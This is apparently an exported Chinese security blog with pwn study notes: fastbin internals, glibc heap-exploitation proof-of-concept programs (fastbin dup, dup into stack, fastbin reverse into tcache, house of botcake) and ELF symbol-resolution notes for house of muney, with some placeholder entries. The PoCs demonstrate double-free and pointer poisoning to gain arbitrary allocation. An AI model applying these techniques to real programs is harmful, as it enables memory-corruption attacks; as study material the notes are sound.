


[{"content":"\rhhh #\rhhhh #\rhhh #\r","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/pwn/heap/","section":"我的博客","summary":"","title":"Basics","type":"posts"},{"content":"\rFast bin attack #\rWhat\u0026rsquo;s fast bin #\rfastbin被存放在fastbinY数组中，该数组一共有10个元素。\n每个fast bin都是一个单链表，只是使用fd指针。fast bin无论是添加还是移除都是对链表尾进行操作，使用后入先出算法，所以fastbinY数组中每个fastbin元素都存放了该链表的尾结点，尾结点通过fd指针指向前一个结点。\nfastbin size：数组中相同的链表存放的chunk大小相同，并且下标相邻的数组元素中的chunk链表的chunk size相差8字节(就是第一个元素chunk size都是16字节，第二个都是24字节，以此类推)，所以默认情况下大小尾16到80字节的chunk会被分到fast chunk中。\nfastbin 合并：不会对freechunk进行合并操作。因为fastchunk本身就是为了快速存取chunk，所以每一个chunk的P位都是设置为1(表示前一个chunk已使用)。但是当释放的chunk与该chunk相邻的空闲chunk合并后大小大于一定的大小时(FASTBIN_CONSOLIDATION_THRESHOLD),内存碎片可能会比较多，我们就需要把fast bin中的chunk都进行合并。\n用户通过malloc请求的大小如果属于fast chunk的大小范围，而这时fast bin支持的最大内存大小以及所有的fast bin链表都是空的(意思就是fast bin里面没有东西)，所以最开始使用malloc申请内存的时候即使申请的内存大小属于fast chunk的内存大小，它也不会交给fast bin处理，而是交给small bin，如果small bin也为空的话就交给unsorted bin。\n当我们第一次调用malloc(fast bin)的时候，系统执行_int_malloc函数，该函数首先会发现当前fast bin为空，就转交给small bin处理，进而又发现small bin 也为空，就调用malloc_consolidate函数对malloc_state结构体进行初始化，malloc_consolidate函数主要完成以下几个功能：\n首先判断当前malloc_state结构体中的fast bin是否为空，如果为空就说明整个malloc_state都没有完成初始化，需要对malloc_state进行初始化。 malloc_state的初始化操作由函数malloc_init_state(av)完成，该函数先初始化除fast bin之外的所有的bins(构建双链表，详情见后文small bins介绍)，再初始化fast bins。 然后当再次执行malloc(fast chunk)函数的时候，此时fast bin相关数据不为空了，就开始使用fast bin。 free(fast chunk)操作：这个操作很简单，主要分为两步：\n先通过chunksize函数根据传入的地址指针获取该指针对应的chunk的大小； 然后根据这个chunk大小获取该chunk所属的fast bin，然后再将此chunk添加到该fast bin的链尾即可。整个操作都是在_int_free函数中完成。得到第一个来自于fast bin的chunk之后，系统就将该chunk从对应的fast bin中移除，并将其地址返回给用户。 fast bin dup #\rglibc2.23 #\rpoc精简 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); free(a); free(b); free(a); a = malloc(8); b = malloc(8); c = malloc(8); fprintf(stderr, \u0026#34;1st malloc(8): %p\\n\u0026#34;, a); fprintf(stderr, \u0026#34;2nd malloc(8): %p\\n\u0026#34;, b); fprintf(stderr, \u0026#34;3rd malloc(8): %p\\n\u0026#34;, c); assert(a == c); } glibc2.27 - glibc2.39 #\rpoc精简 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { void *ptrs[8]; for (int i=0; i\u0026lt;8; i++) { ptrs[i] = malloc(8); } for (int i=0; i\u0026lt;7; i++) { free(ptrs[i]); } int *a = calloc(1, 8); int *b = calloc(1, 8); int *c = calloc(1, 8); printf(\u0026#34;1st calloc(1, 8): %p\\n\u0026#34;, a); printf(\u0026#34;2nd calloc(1, 8): %p\\n\u0026#34;, b); printf(\u0026#34;3rd calloc(1, 8): %p\\n\u0026#34;, c); free(a); free(b); free(a); a = calloc(1, 8); b = calloc(1, 8); c = calloc(1, 8); printf(\u0026#34;1st calloc(1, 8): %p\\n\u0026#34;, a); printf(\u0026#34;2nd calloc(1, 8): %p\\n\u0026#34;, b); printf(\u0026#34;3rd calloc(1, 8): %p\\n\u0026#34;, c); assert(a == c); } fastbin dup consolidate #\rPOC精简 #\rglibc 2.23 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { printf(\u0026#34;This technique will make use of malloc_consolidate and a double free to gain a UAF / duplication of a large-sized chunk\\n\u0026#34;); void* p1 = calloc(1,0x40); printf(\u0026#34;Allocate a fastbin chunk p1=%p \\n\u0026#34;, p1); printf(\u0026#34;Freeing p1 will add it to the fastbin.\\n\\n\u0026#34;); free(p1); void* p3 = malloc(0x400); printf(\u0026#34;a chunk with chunk size 0x410. p3=%p\\n\u0026#34;, p3); assert(p1 == p3); free(p1); // vulnerability void *p4 = malloc(0x400); assert(p4 == p3); printf(\u0026#34;We now have two pointers (p3 and p4) that haven\u0026#39;t been directly freed\\n\u0026#34;); printf(\u0026#34;and both point to the same large-sized chunk. p3=%p p4=%p\\n\u0026#34;, p3, p4); printf(\u0026#34;We have achieved duplication!\\n\\n\u0026#34;); return 0; } glibc 2.27 - glibc 2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; #define CHUNK_SIZE 0x400 int main() { void *ptr[7]; for(int i = 0; i \u0026lt; 7; i++) ptr[i] = malloc(0x40); void* p1 = malloc(0x40); for(int i = 0; i \u0026lt; 7; i++) free(ptr[i]); free(p1); void* p2 = malloc(CHUNK_SIZE); assert(p1 == p2); free(p1); // vulnerability (double free) printf(\u0026#34;It is now in the tcache (or merged with top if we had initially chosen a chunk size \u0026gt; 0x410).\\n\u0026#34;); void *p3 = malloc(CHUNK_SIZE); assert(p3 == p2); printf(\u0026#34;and both point to the same tcache sized chunk. p2=%p p3=%p\\n\u0026#34;, p2, p3); return 0; } fastbin dup into stack #\rPOC精简 #\rglibc 2.23 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; int main() { unsigned long long stack_var; fprintf(stderr, \u0026#34;The address we want malloc() to return is %p.\\n\u0026#34;, 8+(char *)\u0026amp;stack_var); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, \u0026#34;1st malloc(8): %p\\n\u0026#34;, a); fprintf(stderr, \u0026#34;2nd malloc(8): %p\\n\u0026#34;, b); fprintf(stderr, \u0026#34;3rd malloc(8): %p\\n\u0026#34;, c); free(a); free(b); free(a); unsigned long long *d = malloc(8); fprintf(stderr, \u0026#34;1st malloc(8): %p\\n\u0026#34;, d); fprintf(stderr, \u0026#34;2nd malloc(8): %p\\n\u0026#34;, malloc(8)); stack_var = 0x20; *d = (unsigned long long) (((char*)\u0026amp;stack_var) - sizeof(d)); fprintf(stderr, \u0026#34;3rd malloc(8): %p, putting the stack address on the free list\\n\u0026#34;, malloc(8)); fprintf(stderr, \u0026#34;4th malloc(8): %p\\n\u0026#34;, malloc(8)); } glibc 2.27 - glibc 2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { void *ptrs[7]; for (int i=0; i\u0026lt;7; i++) { ptrs[i] = malloc(8); } for (int i=0; i\u0026lt;7; i++) { free(ptrs[i]); } unsigned long long stack_var; int *a = calloc(1,8); int *b = calloc(1,8); int *c = calloc(1,8); fprintf(stderr, \u0026#34;1st calloc(1,8): %p\\n\u0026#34;, a); fprintf(stderr, \u0026#34;2nd calloc(1,8): %p\\n\u0026#34;, b); fprintf(stderr, \u0026#34;3rd calloc(1,8): %p\\n\u0026#34;, c); free(a); free(b); free(a); unsigned long long *d = calloc(1,8); fprintf(stderr, \u0026#34;1st calloc(1,8): %p\\n\u0026#34;, d); fprintf(stderr, \u0026#34;2nd calloc(1,8): %p\\n\u0026#34;, calloc(1,8)); stack_var = 0x20; *d = (unsigned long long) (((char*)\u0026amp;stack_var) - sizeof(d) - 1); //注意对齐 fprintf(stderr, \u0026#34;3rd calloc(1,8): %p, putting the stack address on the free list\\n\u0026#34;, calloc(1,8)); void *p = calloc(1,8); fprintf(stderr, \u0026#34;4th calloc(1,8): %p\\n\u0026#34;, p); // assert((long)__builtin_return_address(0) == *(long *)p); } fastbin_reverse_into_tcache #\r知识点 #\rlibc 2.32以上tache 和fastbin 会有地址加密 程序每当从fastbin/small bin中取出一个堆块，会尝试把该bin中剩余的堆块拿出来去填充tcache。 POC #\rglibc 2.27 - glibc 2.31 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;assert.h\u0026gt; const size_t allocsize = 0x40; int main(){ setbuf(stdout, NULL); char* ptrs[14]; size_t i; for (i = 0; i \u0026lt; 14; i++) { ptrs[i] = malloc(allocsize); } for (i = 0; i \u0026lt; 7; i++) { free(ptrs[i]); } char* victim = ptrs[7]; free(victim); for (i = 8; i \u0026lt; 14; i++) { free(ptrs[i]); } size_t stack_var[6]; memset(stack_var, 0xcd, sizeof(stack_var)); *(size_t**)victim = \u0026amp;stack_var[0]; // Empty tcache. for (i = 0; i \u0026lt; 7; i++) { ptrs[i] = malloc(allocsize); } for (i = 0; i \u0026lt; 6; i++) { printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); } malloc(allocsize); for (i = 0; i \u0026lt; 6; i++) { printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); } char *q = malloc(allocsize); printf( \u0026#34;\\n\u0026#34; \u0026#34;Finally, if we malloc one more time then we get the stack address back: %p\\n\u0026#34;, q ); assert(q == (char *)\u0026amp;stack_var[2]); return 0; } glibc 2.32 - glibc 2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;assert.h\u0026gt; const size_t allocsize = 0x40; int main(){ setbuf(stdout, NULL); // Allocate 14 times so that we can free later. char* ptrs[14]; size_t i; for (i = 0; i \u0026lt; 14; i++) { ptrs[i] = malloc(allocsize); } // Fill the tcache. for (i = 0; i \u0026lt; 7; i++) free(ptrs[i]); char* victim = ptrs[7]; free(victim); for (i = 8; i \u0026lt; 14; i++) free(ptrs[i]); size_t stack_var[6]; memset(stack_var, 0xcd, sizeof(stack_var)); *(size_t**)victim = (size_t*)((long)\u0026amp;stack_var[0] ^ ((long)victim \u0026gt;\u0026gt; 12)); for (i = 0; i \u0026lt; 7; i++) ptrs[i] = malloc(allocsize); for (i = 0; i \u0026lt; 6; i++) printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); malloc(allocsize); for (i = 0; i \u0026lt; 6; i++) printf(\u0026#34;%p: %p\\n\u0026#34;, \u0026amp;stack_var[i], (char*)stack_var[i]); char *q = malloc(allocsize); printf(\u0026#34;\\n\u0026#34; \u0026#34;Finally, if we malloc one more time then we get the stack address back: %p\\n\u0026#34;, q); assert(q == (char *)\u0026amp;stack_var[2]); return 0; } ","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/pwn/heap/fastbin_attack/","section":"我的博客","summary":"","title":"Fast bin attack","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/git/","section":"我的博客","summary":"","title":"Git","type":"posts"},{"content":"\rhhh #\rggg #\r","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/git/test/","section":"我的博客","summary":"","title":"Git","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/","section":"我的博客","summary":"","title":"House of系列","type":"posts"},{"content":"\rHi there 👋 #\r🐳 Principal Product Manager @ Docker 🐡 Creator and maintainer of Blowfish @ Blowfish page 🚀 Personal blog - n9o.xyz 📚 mentoring @ mentorcruise house of botcake #\r介绍 #\rHouse of botcacke 合理利用了 Tcache 和 Unsortedbin 的机制，同一堆块第一次 Free 进 Unsortedbin 避免了 key 的产生，第二次 Free 进入 Tcache，让高版本的 Tcache Double Free 再次成为可能。\nPOC #\rglibc 2.27 - 2.31 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { intptr_t stack_var[4]; intptr_t *x[7]; for(int i=0; i\u0026lt;sizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } puts(\u0026#34;Allocating a chunk for later consolidation\u0026#34;); intptr_t *prev = malloc(0x100); puts(\u0026#34;Allocating the victim chunk.\u0026#34;); intptr_t *a = malloc(0x100); printf(\u0026#34;malloc(0x100): a=%p.\\n\u0026#34;, a); puts(\u0026#34;Allocating a padding to prevent consolidation.\\n\u0026#34;); malloc(0x10); // cause chunk overlapping puts(\u0026#34;Now we are able to cause chunk overlapping\u0026#34;); puts(\u0026#34;Step 1: fill up tcache list\u0026#34;); for(int i=0; i\u0026lt;7; i++){ free(x[i]); } puts(\u0026#34;Step 2: free the victim chunk so it will be added to unsorted bin\u0026#34;); free(a); puts(\u0026#34;Step 3: free the previous chunk and make it consolidate with the victim chunk.\u0026#34;); free(prev); puts(\u0026#34;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\\n\u0026#34;); malloc(0x100); free(a);// a is already freed intptr_t *b = malloc(0x120); b[0x120/8-2] = (long)stack_var; malloc(0x100); intptr_t *c = malloc(0x100); printf(\u0026#34;The new chunk is at %p\\n\u0026#34;, c); // sanity check assert(c==stack_var); printf(\u0026#34;Got control on target/stack!\\n\\n\u0026#34;); return 0; } glibc 2.32\u0026ndash;2.39 #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;assert.h\u0026gt; int main() { setbuf(stdin, NULL); setbuf(stdout, NULL); // prepare the target intptr_t stack_var[4]; intptr_t *x[7]; for(int i=0; i\u0026lt;sizeof(x)/sizeof(intptr_t*); i++){ x[i] = malloc(0x100); } puts(\u0026#34;Allocating a chunk for later consolidation\u0026#34;); intptr_t *prev = malloc(0x100); puts(\u0026#34;Allocating the victim chunk.\u0026#34;); intptr_t *a = malloc(0x100); printf(\u0026#34;malloc(0x100): a=%p.\\n\u0026#34;, a); puts(\u0026#34;Allocating a padding to prevent consolidation.\\n\u0026#34;); malloc(0x10); for(int i=0; i\u0026lt;7; i++){ free(x[i]); } free(a); free(prev); malloc(0x100); free(a);// a is already freed intptr_t *b = malloc(0x120); puts(\u0026#34;We simply overwrite victim\u0026#39;s fwd pointer\u0026#34;); b[0x120/8-2] = (long)stack_var; // take target out puts(\u0026#34;Now we can cash out the target chunk.\u0026#34;); malloc(0x100); intptr_t *c = malloc(0x100); printf(\u0026#34;The new chunk is at %p\\n\u0026#34;, c); // sanity check assert(c==stack_var); return 0; } 利用思路 #\r申请7个0x100大小的chunk 在申请大小为0x100的chunk1 ，chunk2 free 7个chunk填充tcache free chunk2,chunk1 ，使其进入unsorted bin，并因为连续所以合并。 malloc 0x100，从tache里取出一个free chunk free chunk2 使其进入 tache bin，这样tache bin中就有了unsorted bin中的一块小内存 malloc 0x120 从 unsorted bin中分割出来一块内存，可覆盖chunk2的next指针 伪造next指针 ","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of-botcake/","section":"我的博客","summary":"","title":"House of系列","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/pwn/","section":"我的博客","summary":"这是网站的第一篇你帖子","title":"PWN","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/python/","section":"我的博客","summary":"","title":"Python","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/web/","section":"我的博客","summary":"","title":"Web","type":"posts"},{"content":"","date":"2025 年 6 月 21 日","externalUrl":null,"permalink":"/posts/","section":"我的博客","summary":"","title":"我的博客","type":"posts"},{"content":"\rHouse of 系列 #\rhouse of muney #\rELF文件解析 #\r节的结构 #\r静态视图下，组成elf文件的基本单位是section，可以翻译为节。\nelf头会定义节头表(所谓的表，其实都是数组，数组的每个元素都是一个结构体，比如dyn/rel等)\n节头表中定义了节的数量、每个节的类型、起始的虚拟地址。\n与动态链接相关的节为.dynamic节，这里面存储这与动态链接相关的描述信息。\n.dynamic实际是一个数组，数组的每一个元素对应的数据结构为： typedef struct { Elf64_Sxword\td_tag;\t/* Dynamic entry type. 表示的是节的类型 */ union { Elf64_Xword d_val;\t/* Integer value */ Elf64_Addr d_ptr;\t/* Address value */ //这个联合体有时候表示的是这个节处在节表中的下标，有时候表示这个节的虚拟地址 } d_un; } Elf64_Dyn; 与符号查找相关的是STRTAB和SYMTAB节类型。\nSTRTAB：字符串表 ，包含一大串字符串，包含整个程序中所使用到的所有字符。\nSYMTAB：符号表，包含符号的定义，其对应的数据结构为：\ntypedef struct { Elf64_Word st_name; // 符号名在.dynstr中的偏移 unsigned char st_info; // 符号类型（STT_FUNC等）和绑定属性（STB_GLOBAL等） unsigned char st_other; //通常为 0，表示符号可见性为默认（无需修改）。 Elf64_Section st_shndx; // 符号所属的节区索引 Elf64_Addr st_value; // 符号的地址（如函数地址） Elf64_Xword st_size; // 符号大小 } Elf64_Sym; //如果修改st_name这个下标，就能解析出不同的符号地址。 //关于st_value,当符号是一个函数或者变量的时候，这个值就代表符号的虚拟地址，如果开启了PIE，那么符号的实际地址就是加载的基地址加上这个值。 符号类型：符号的绑定属性（st_info字段）分为： STB_LOCAL：局部符号，仅在当前模块可见。 0x0 STB_GLOBAL：全局符号，可被其他模块引用。 0x1 STB_WEAK：弱符号，优先级低于全局符号。 0x2 符号表和字符串表描述了怎么找到符号，但是如何标识哪些符号需要重定位，则需要使用到重定位表。\n重定位表数据结构\ntypedef struct { Elf64_Addr\tr_offset;\t/* Address */ Elf64_Xword\tr_info;\t/* Relocation type and symbol index */ } Elf64_Rel; r_offset：这个值代表对应符号在got表中的地址。使用 libc.got['xxx']得到的就是这个地址。 r_info：有两部分组成，低32位表示重定位入口的类型，高32位表示这个重定位符号在符号表中的下标。 ret2plt流程图\nplt[0]处代码\npush ModuleID jmp _dl_runtime_resolve 第一次调用got表处代码\npush n jmp plt[0] .gnu.hash 节的结构 #\r.gnu.hash 节的结构如下（以64位ELF为例）：\nnbuckets (4字节)：哈希桶的数量。 symndx (4字节)：第一个全局符号在动态符号表（.dynsym）中的索引。 maskwords (4字节)：布隆过滤器掩码的位数（以 _wordsize 为单位）。 shift2 (4字节)：布隆过滤器计算的位移值。 布隆过滤器数组：每个元素大小为 _wordsize 字节（64位下为8字节）。 哈希桶数组：每个桶条目占4字节，指向符号链表的起始索引。 哈希值数组：每个哈希值占4字节。 查找函数符号真实地址流程 #\r调用大概 #\r从 plt 表跳转到 got 表\npush n/push ModuleID，然后跳转到_dl_runtime_resolve 函数。\n上一步实际是找到符号的重定位表条目。在重定位表中，分别记录了解析好地址后需要回填的地址，即符号的 got 表地址，同时记录了符号所在的符号表的下标。\n动态链接器解析符号（如调用exit）\n计算哈希值：对符号名（如\u0026quot;exit\u0026quot;）计算GNU哈希值。 布隆过滤：检查哈希值是否可能存在于哈希表中。 定位哈希桶：根据哈希值找到对应的哈希桶（bucket）。 遍历哈希链： 从桶中获取链的起始索引 chain_index。 实际符号索引 bucket = chain_index + symoffset。 symoffset 是 .dynsym 中第一个全局符号的索引值。 例如，若 .dynsym 前5个符号是局部符号（索引0~4），第6个符号（索引5）是第一个全局符号，则 symoffset = 5。 遍历哈希链，匹配哈希值后，通过索引在 .dynsym 中找到符号条目。 找到符号之后，计算出真实的偏移，然后填回到 got 表，避免下一次重新解析\n调用该函数\n.gnu.hash节中的哈希桶和 .dynsym 节的关系 #\r.gnu.hash 节 .dynsym 节\r+-------------------+ +-------------------+\r| 哈希桶数组 | | Elf64_Sym[0] |\r| buckets[0]: 0 +--------------\u0026gt;| (局部符号，忽略) |\r| buckets[1]: 2 | +-------------------+\r| ... | | Elf64_Sym[1] |\r+-------------------+ | (局部符号，忽略) |\r+-------------------+\r哈希链数组index = bucket - symoffset | Elf64_Sym[bucket] |\r+-------------------+ | (全局符号开始) |\r| hasharr[index]:0xABC | \u0026lt;---------|st_name: \u0026#34;exit\u0026#34; |\r| hasharr[index+1]:0xDEF| | st_value: 0x... |\r+-------------------+ +-------------------+ 细节 #\r涉及的数据结构 #\r.dynamic 实际是一个数组，数组的每一个元素对应的数据结构：\ntypedef struct { Elf64_Sxword\td_tag;\t/* Dynamic entry type */ union { Elf64_Xword d_val;\t/* Integer value */ Elf64_Addr d_ptr;\t/* Address value */ } d_un; } Elf64_Dyn; 符号表的数据结构：\ntypedef struct { Elf64_Word st_name; // 符号名在.dynstr中的偏移 unsigned char st_info; // 符号类型（STT_FUNC等）和绑定属性（STB_GLOBAL等） unsigned char st_other; Elf64_Section st_shndx; // 符号所属的节区索引 Elf64_Addr st_value; // 符号的地址（如函数地址） Elf64_Xword st_size; // 符号大小 } Elf64_Sym; 重定位表的数据结构：\ntypedef struct { Elf64_Addr\tr_offset;\t/* Address */ Elf64_Xword\tr_info;\t/* Relocation type and symbol index */ } Elf64_Rel; link_map的数据结构：\nstruct symtab_cache { // 这里可以包含缓存相关的具体成员，如哈希表、缓存条目等 // 简化示例中暂不详细展开 }; // 表示已找到的版本信息 struct r_found_version { // 这里可以包含版本相关的具体成员，如版本号、版本标志等 // 简化示例中暂不详细展开 }; // 链接映射结构，代表一个已加载的共享对象 struct link_map { // 共享对象加载到内存中的基地址 // 所有共享对象内的相对地址都要加上这个基地址才是实际内存地址 ElfW(Addr) l_addr; // 指向共享对象的绝对文件名的字符串指针 // 用于标识该共享对象是从哪个文件加载的 char *l_name; // 指向共享对象的动态节（.dynamic 节）的指针 // 动态节包含了共享对象动态链接相关的重要信息，如符号表、重定位表位置等 ElfW(Dyn) *l_ld; // 指向下一个加载的共享对象的 link_map 指针 // 用于将所有已加载的共享对象连接成一个双向链表 struct link_map *l_next; // 指向前一个加载的共享对象的 link_map 指针 // 用于将所有已加载的共享对象连接成一个双向链表 struct link_map *l_prev; // 本地符号查找的缓存指针 // 可以提高本地符号查找的效率，减少遍历符号表的次数 struct symtab_cache *l_local_cache; // 全局符号查找的缓存指针 // 可以提高全局符号查找的效率，减少遍历符号表的次数 struct symtab_cache *l_global_cache; l_gnu_chain_zero // 只读重定位（RELRO）段的起始地址 // RELRO 段包含程序加载时已完成重定位的只读数据，有助于提高程序安全性 ElfW(Addr) l_relro_addr; // 只读重定位（RELRO）段的大小 ElfW(Addr) l_relro_size; // 共享对象初始化函数的地址 // 在共享对象加载后，动态链接器会调用此函数进行初始化操作 ElfW(Addr) l_init; // 共享对象终止函数的地址 // 在共享对象卸载前，动态链接器会调用此函数进行清理操作 ElfW(Addr) l_fini; // 指向实际的 link_map // 在某些情况下可能存在代理或虚拟的 link_map，l_real 指向真正的共享对象信息 struct link_map *l_real; // 共享对象的类型，如可执行文件、共享库等 // 可以通过不同的值来区分不同类型的加载对象 int l_type; ... ... }; 细节流程 #\r1.跳转到_dl_runtime_resolve函数后，保存各个寄存器数据，然后call _dl_fixup 这个函数，获取到真实的地址，把地址保存在 r11 寄存器中，把相关数据恢复后，直接 jmp r11。\nDump of assembler code for function _dl_runtime_resolve_xsavec: 0x00007ffff7fe7bc0 \u0026lt;+0\u0026gt;:\tendbr64 0x00007ffff7fe7bc4 \u0026lt;+4\u0026gt;:\tpush rbx 0x00007ffff7fe7bc5 \u0026lt;+5\u0026gt;:\tmov rbx,rsp 0x00007ffff7fe7bc8 \u0026lt;+8\u0026gt;:\tand rsp,0xffffffffffffffc0 0x00007ffff7fe7bcc \u0026lt;+12\u0026gt;:\tsub rsp,QWORD PTR [rip+0x14b35] # 0x7ffff7ffc708 \u0026lt;_rtld_global_ro+232\u0026gt; 0x00007ffff7fe7bd3 \u0026lt;+19\u0026gt;:\tmov QWORD PTR [rsp],rax 0x00007ffff7fe7bd7 \u0026lt;+23\u0026gt;:\tmov QWORD PTR [rsp+0x8],rcx 0x00007ffff7fe7bdc \u0026lt;+28\u0026gt;:\tmov QWORD PTR [rsp+0x10],rdx 0x00007ffff7fe7be1 \u0026lt;+33\u0026gt;:\tmov QWORD PTR [rsp+0x18],rsi 0x00007ffff7fe7be6 \u0026lt;+38\u0026gt;:\tmov QWORD PTR [rsp+0x20],rdi 0x00007ffff7fe7beb \u0026lt;+43\u0026gt;:\tmov QWORD PTR [rsp+0x28],r8 0x00007ffff7fe7bf0 \u0026lt;+48\u0026gt;:\tmov QWORD PTR [rsp+0x30],r9 0x00007ffff7fe7bf5 \u0026lt;+53\u0026gt;:\tmov eax,0xee 0x00007ffff7fe7bfa \u0026lt;+58\u0026gt;:\txor edx,edx 0x00007ffff7fe7bfc \u0026lt;+60\u0026gt;:\tmov QWORD PTR [rsp+0x250],rdx 0x00007ffff7fe7c04 \u0026lt;+68\u0026gt;:\tmov QWORD PTR [rsp+0x258],rdx 0x00007ffff7fe7c0c \u0026lt;+76\u0026gt;:\tmov QWORD PTR [rsp+0x260],rdx 0x00007ffff7fe7c14 \u0026lt;+84\u0026gt;:\tmov QWORD PTR [rsp+0x268],rdx 0x00007ffff7fe7c1c \u0026lt;+92\u0026gt;:\tmov QWORD PTR [rsp+0x270],rdx 0x00007ffff7fe7c24 \u0026lt;+100\u0026gt;:\tmov QWORD PTR [rsp+0x278],rdx 0x00007ffff7fe7c2c \u0026lt;+108\u0026gt;:\txsavec [rsp+0x40] 0x00007ffff7fe7c31 \u0026lt;+113\u0026gt;:\tmov rsi,QWORD PTR [rbx+0x10] 0x00007ffff7fe7c35 \u0026lt;+117\u0026gt;:\tmov rdi,QWORD PTR [rbx+0x8] =\u0026gt; 0x00007ffff7fe7c39 \u0026lt;+121\u0026gt;:\tcall 0x7ffff7fe00c0 \u0026lt;_dl_fixup\u0026gt; 0x00007ffff7fe7c3e \u0026lt;+126\u0026gt;:\tmov r11,rax 0x00007ffff7fe7c41 \u0026lt;+129\u0026gt;:\tmov eax,0xee 0x00007ffff7fe7c46 \u0026lt;+134\u0026gt;:\txor edx,edx 0x00007ffff7fe7c48 \u0026lt;+136\u0026gt;:\txrstor [rsp+0x40] 0x00007ffff7fe7c4d \u0026lt;+141\u0026gt;:\tmov r9,QWORD PTR [rsp+0x30] 0x00007ffff7fe7c52 \u0026lt;+146\u0026gt;:\tmov r8,QWORD PTR [rsp+0x28] 0x00007ffff7fe7c57 \u0026lt;+151\u0026gt;:\tmov rdi,QWORD PTR [rsp+0x20] 0x00007ffff7fe7c5c \u0026lt;+156\u0026gt;:\tmov rsi,QWORD PTR [rsp+0x18] 0x00007ffff7fe7c61 \u0026lt;+161\u0026gt;:\tmov rdx,QWORD PTR [rsp+0x10] 0x00007ffff7fe7c66 \u0026lt;+166\u0026gt;:\tmov rcx,QWORD PTR [rsp+0x8] 0x00007ffff7fe7c6b \u0026lt;+171\u0026gt;:\tmov rax,QWORD PTR [rsp] 0x00007ffff7fe7c6f \u0026lt;+175\u0026gt;:\tmov rsp,rbx 0x00007ffff7fe7c72 \u0026lt;+178\u0026gt;:\tmov rbx,QWORD PTR [rsp] 0x00007ffff7fe7c76 \u0026lt;+182\u0026gt;:\tadd rsp,0x18 0x00007ffff7fe7c7a \u0026lt;+186\u0026gt;:\tbnd jmp r11 End of assembler dump. _dl_fixup函数：\nDL_FIXUP_VALUE_TYPE attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE _dl_fixup ( # ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS ELF_MACHINE_RUNTIME_FIXUP_ARGS, # endif struct link_map *l, ElfW(Word) reloc_arg) { // 这里的l是二进制程序本身的link_map，而不是so的 // 第二个参数即为push n，所查找的符号在重定位表.rel.plt中的索引 // 首先根据link_map中记录的信息，找到动态链接相关的符号表和字符串表 const ElfW(Sym) *const symtab = (const void *) D_PTR (l, l_info[DT_SYMTAB]); const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]); // 找到对应的重定位元素、符号表、字符串 const PLTREL *const reloc = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset); const ElfW(Sym) *sym = \u0026amp;symtab[ELFW(R_SYM) (reloc-\u0026gt;r_info)]; const ElfW(Sym) *refsym = sym; // rel_addr 即为got表的地址，在查找到符号真实地址之后会回填到这个地址中 void *const rel_addr = (void *)(l-\u0026gt;l_addr + reloc-\u0026gt;r_offset); lookup_t result; DL_FIXUP_VALUE_TYPE value; /* Sanity check that we\u0026#39;re really looking at a PLT relocation. */ assert (ELFW(R_TYPE)(reloc-\u0026gt;r_info) == ELF_MACHINE_JMP_SLOT); /* Look up the target symbol. If the normal lookup rules are not used don\u0026#39;t look in the global scope. */ if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-\u0026gt;st_other), 0) == 0) { const struct r_found_version *version = NULL; if (l-\u0026gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL) { const ElfW(Half) *vernum = (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-\u0026gt;r_info)] \u0026amp; 0x7fff; version = \u0026amp;l-\u0026gt;l_versions[ndx]; if (version-\u0026gt;hash == 0) version = NULL; } /* We need to keep the scope around so do some locking. This is not necessary for objects which cannot be unloaded or when we are not using any threads (yet). */ int flags = DL_LOOKUP_ADD_DEPENDENCY; if (!RTLD_SINGLE_THREAD_P) { THREAD_GSCOPE_SET_FLAG (); flags |= DL_LOOKUP_GSCOPE_LOCK; } #ifdef RTLD_ENABLE_FOREIGN_CALL 